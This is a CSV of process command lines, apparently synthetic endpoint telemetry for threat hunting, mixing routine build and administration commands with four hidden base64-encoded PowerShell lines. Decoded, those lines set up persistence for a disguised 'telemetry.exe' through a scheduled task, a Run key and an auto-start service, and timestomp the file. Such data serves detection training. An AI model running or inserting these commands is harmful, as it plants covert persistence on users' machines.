process_name,command_line
powershell.exe,powershell -nop -w hidden -enc cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AcwBjACAAbQBpAG4AdQB0AGUAIAAvAG0AbwAgADUAIAAvAHQAbgAgAFQAZQBsAGUAbQBlAHQAcgB5ACAALwB0AHIAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAEMAcgB5AHAAdABvAFwAdABlAGwAZQBtAGUAdAByAHkALgBlAHgAZQAgAC8AZgA=
powershell.exe,Get-Process | Sort-Object CPU -Descending | Select -First 10
msbuild.exe,msbuild /t:Rebuild /p:Configuration=Release
curl.exe,curl.exe -s http://localhost:5000/health
choco.exe,choco install nodejs -y
sqlcmd.exe,"sqlcmd -S db -d nginx -Q ""SELECT COUNT(*) FROM dbo.Orders"""
powershell.exe,Get-ChildItem C:\Users\svc_sql\Documents
git.exe,git pull origin main
dotnet.exe,dotnet test
powershell.exe,Get-Service | Where-Object Status -eq Running
python.exe,python -m pytest tests\ -q
git.exe,git status
sc.exe,sc query search
powershell.exe,Restart-Service -Name payments
docker.exe,docker build -t nginx:33 .
net.exe,net use Z: \\fileserver\share
kubectl.exe,kubectl get pods -n production
powershell.exe,Restart-Service -Name postgres
pip.exe,pip install -r requirements.txt
powershell.exe,powershell -nop -w hidden -enc cgBlAGcAIABhAGQAZAAgAEgASwBDAFUAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAgAC8AdgAgAFMAeQBuAGMAIAAvAGQAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAEMAcgB5AHAAdABvAFwAdABlAGwAZQBtAGUAdAByAHkALgBlAHgAZQAgAC8AZgA=
tasklist.exe,tasklist /fo table
explorer.exe,explorer C:\Users\svc_sql\Downloads
powershell.exe,powershell -nop -w hidden -enc cwBjACAAYwByAGUAYQB0AGUAIABVAHAAZABTAHkAbgBjACAAYgBpAG4AUABhAHQAaAA9ACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATQBpAGMAcgBvAHMAbwBmAHQAXABDAHIAeQBwAHQAbwBcAHQAZQBsAGUAbQBlAHQAcgB5AC4AZQB4AGUAIABzAHQAYQByAHQAPQAgAGEAdQB0AG8A
systeminfo.exe,systeminfo
powershell.exe,Test-Connection -Count 2 db-56
git.exe,git commit -am 'chore: bump nodejs'
dotnet.exe,dotnet build billing-service.sln -c Release
dotnet.exe,dotnet build web-app.sln -c Release
robocopy.exe,robocopy C:\build\dist \\web\redis /MIR /NFL
sc.exe,sc query auth-svc
sqlcmd.exe,"sqlcmd -S db -d search -Q ""SELECT COUNT(*) FROM dbo.Orders"""
docker.exe,docker ps -a
git.exe,git commit -am 'chore: bump python3-pip'
powershell.exe,powershell -nop -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIAAiACgAZwBpACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATQBpAGMAcgBvAHMAbwBmAHQAXABDAHIAeQBwAHQAbwBcAHQAZQBsAGUAbQBlAHQAcgB5AC4AZQB4AGUAKQAuAEwAYQBzAHQAVwByAGkAdABlAFQAaQBtAGUAPQAoAGcAaQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABuAG8AdABlAHAAYQBkAC4AZQB4AGUAKQAuAEwAYQBzAHQAVwByAGkAdABlAFQAaQBtAGUAIgA=
robocopy.exe,robocopy C:\build\dist \\web\api-gateway /MIR /NFL
docker.exe,docker build -t auth-svc:54 .
git.exe,git pull origin feature/checkout
ipconfig.exe,ipconfig /all
git.exe,git commit -am 'chore: bump ripgrep'
powershell.exe,Get-EventLog -LogName Application -Newest 20
robocopy.exe,robocopy C:\build\dist \\web\auth-svc /MIR /NFL
git.exe,git commit -am 'chore: bump htop'
git.exe,git pull origin release/2.4
docker.exe,docker build -t postgres:80 .
powershell.exe,Restart-Service -Name auth-svc
dotnet.exe,dotnet build data-pipeline.sln -c Release
git.exe,git pull origin hotfix/login
robocopy.exe,robocopy C:\build\dist \\web\payments /MIR /NFL
